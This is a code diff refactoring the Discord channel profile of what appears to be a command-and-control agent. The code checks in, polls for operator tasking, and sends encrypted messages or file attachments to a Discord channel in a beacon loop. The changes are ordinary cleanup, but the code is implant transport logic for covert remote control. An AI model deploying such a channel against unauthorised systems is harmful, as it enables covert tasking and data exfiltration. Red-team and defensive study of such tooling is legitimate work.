@@ -30,7 +30,6 @@ namespace Agent.Profiles
         private CheckinResponse cir;
 
         private bool checkedin = false;
-        private bool connected = false;
         private int currentAttempt = 0;
         private int maxAttempts = 10;
 
@@ -43,12 +42,20 @@ namespace Agent.Profiles
             this.agentConfig = config;
             this.logger = logger;
             this.messageManager = messageManager;
-            var opts = System.Text.Json.JsonSerializer.Deserialize(
-                ChannelConfig.Decode(),
-                DiscordChannelOptionsJsonContext.Default.DiscordChannelOptions)
-                ?? throw new InvalidOperationException("Invalid Discord profile configuration");
-            _token = opts.DiscordToken;
-            _channel_id = ulong.Parse(opts.BotChannel);
+            DiscordChannelOptions? opts = null;
+            try
+            {
+                opts = System.Text.Json.JsonSerializer.Deserialize(
+                    ChannelConfig.Decode(),
+                    DiscordChannelOptionsJsonContext.Default.DiscordChannelOptions);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Failed to deserialize Discord channel options: {ex.Message}");
+            }
+            opts ??= new DiscordChannelOptions();
+            _token = opts.DiscordToken ?? string.Empty;
+            _ = ulong.TryParse(opts.BotChannel, out _channel_id);
 
             var gateway_config = new DiscordSocketConfig()
             {
@@ -63,7 +70,7 @@ namespace Agent.Profiles
             _client.Ready += _client_Ready;
         }
 
-        private async Task _client_Ready()
+        private Task _client_Ready()
         {
             _channel = (ITextChannel)_client.GetChannel(_channel_id);
 
@@ -72,6 +79,7 @@ namespace Agent.Profiles
                 Environment.Exit(0);
             }
             clientReady.Set();
+            return Task.CompletedTask;
         }
 
         private async Task _client_MessageReceived(SocketMessage message)
@@ -122,29 +130,7 @@ namespace Agent.Profiles
 
             try
             {
-                string plaintext = this.crypt.Decrypt(discordMessage.message);
-                if (!checkedin)
-                {
-                    CheckinResponse? response = System.Text.Json.JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
-                    if (!CheckinResponseValidation.IsSuccessful(response))
-                    {
-                        return true;
-                    }
-
-                    cir = response;
-                    checkinAvailable.Set();
-                    return true;
-                }
-
-                //If we make it to here, it's a tasking response
-                GetTaskingResponse? gtr = System.Text.Json.JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                if (gtr?.action != "get_tasking")
-                {
-                    return true;
-                }
-
-                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                this.SetTaskingReceived?.Invoke(this, tra);
+                ProcessDecryptedMessage(this.crypt.Decrypt(discordMessage.message));
             }
             catch
             {
@@ -153,6 +139,32 @@ namespace Agent.Profiles
 
             return true;
         }
+
+        private void ProcessDecryptedMessage(string plaintext)
+        {
+            if (!checkedin)
+            {
+                CheckinResponse? response = System.Text.Json.JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
+                if (!CheckinResponseValidation.IsSuccessful(response))
+                {
+                    return;
+                }
+
+                cir = response;
+                checkinAvailable.Set();
+                return;
+            }
+
+            //If we make it to here, it's a tasking response
+            GetTaskingResponse? gtr = System.Text.Json.JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+            if (gtr?.action == "get_tasking")
+            {
+                this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
+            }
+        }
+
+        private Task<bool> EnsureLoggedIn() =>
+            getLoginState() == LoginState.LoggedIn ? Task.FromResult(true) : this.Start();
 
         private async Task<bool> Start()
         {
@@ -181,7 +193,7 @@ namespace Agent.Profiles
             catch (OperationCanceledException)
             {
                 ObserveFault(operation);
-                throw;
+                return false;
             }
         }
 
@@ -194,44 +206,26 @@ namespace Agent.Profiles
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            //Write our checkin message to the pipe
-
             await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-            //Wait for a bounded interval for a checkin response message.
-            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
+            if (!await CheckinResponseWait.WaitAsync(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
             {
                 return new CheckinResponse { status = "failed" };
             }
 
-            //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
-
             return this.cir;
         }
-
-        private static Task<bool> WaitForCheckinResponse(
-            ManualResetEventSlim signal,
-            TimeSpan timeout,
-            CancellationToken cancellationToken) =>
-            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);
 
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                if (getLoginState() != LoginState.LoggedIn)
+                if (!await EnsureLoggedIn())
                 {
-                    if (!await this.Start())
-                    {
-                        this.currentAttempt++;
-                        if (this.currentAttempt >= this.maxAttempts)
-                        {
-                            this.cancellationTokenSource.Cancel();
-                        }
-                        continue;
-                    }
+                    RecordAttemptResult(false);
+                    continue;
                 }
 
                 //Check if we have something to send.
@@ -239,7 +233,7 @@ namespace Agent.Profiles
                 {
                     try
                     {
-                        await WaitWhileIdle(cancellationTokenSource.Token);
+                        await Task.Delay(100, cancellationTokenSource.Token);
                     }
                     catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                     {
@@ -253,59 +247,50 @@ namespace Agent.Profiles
                     bool delivered = await messageManager.DeliverAsync(
                         this.Send,
                         result => result);
-                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
+                    RecordAttemptResult(delivered);
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    this.currentAttempt++;
-                }
-
-                if (this.currentAttempt >= this.maxAttempts)
-                {
-                    this.cancellationTokenSource.Cancel();
+                    RecordAttemptResult(false);
                 }
             }
         }
 
-        private static Task WaitWhileIdle(CancellationToken cancellationToken)
+        private void RecordAttemptResult(bool succeeded)
         {
-            return Task.Delay(100, cancellationToken);
+            this.currentAttempt = succeeded ? 0 : this.currentAttempt + 1;
+            if (this.currentAttempt >= this.maxAttempts)
+            {
+                this.cancellationTokenSource.Cancel();
+            }
         }
 
         internal async Task<bool> Send(string json)
         {
-            if (getLoginState() != LoginState.LoggedIn)
+            if (!await EnsureLoggedIn())
             {
-                if (!await this.Start())
-                {
-                    return false;
-                }
+                return false;
             }
 
-            string msg = this.crypt.Encrypt(json);
-            MessageWrapper discordMessage = new MessageWrapper()
+            var discordMessage = new MessageWrapper()
             {
                 to_server = true,
                 sender_id = _uuid,
-                message = msg,
+                message = this.crypt.Encrypt(json),
                 client_id = "",
             };
 
-            if (_channel is null)
-            {
-                _channel = (ITextChannel)_client.GetChannel(_channel_id);
-            }
+            _channel ??= (ITextChannel)_client.GetChannel(_channel_id);
+            string serializedMessage = System.Text.Json.JsonSerializer.Serialize(discordMessage);
 
             if (json.Length > 1950)
             {
-                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
-                {
-                    await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
-                }
+                using var stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(serializedMessage));
+                await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
             }
             else
             {
-                await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
+                await _channel.SendMessageAsync(serializedMessage);
             }
 
             return true;
@@ -316,26 +301,21 @@ namespace Agent.Profiles
             this.cancellationTokenSource.Cancel();
             return true;
         }
+
         private async Task<string> GetFileContentsAsync(string url)
         {
-            string message = String.Empty;
+            string message = string.Empty;
             try
             {
-                using (HttpResponseMessage response = await _httpClient.GetAsync(url))
-                {
-                    using (HttpContent content = response.Content)
-                    {
-                        message = await content.ReadAsStringAsync();
-                    }
-                }
+                using HttpResponseMessage response = await _httpClient.GetAsync(url);
+                using HttpContent content = response.Content;
+                message = await content.ReadAsStringAsync();
             }
             catch { }
-            return await Unescape(message) ?? "";
+            return Unescape(message);
         }
-        private async Task<string> Unescape(string message)
-        {
-            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
 
-        }
+        private static string Unescape(string message) =>
+            message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
     }
 }
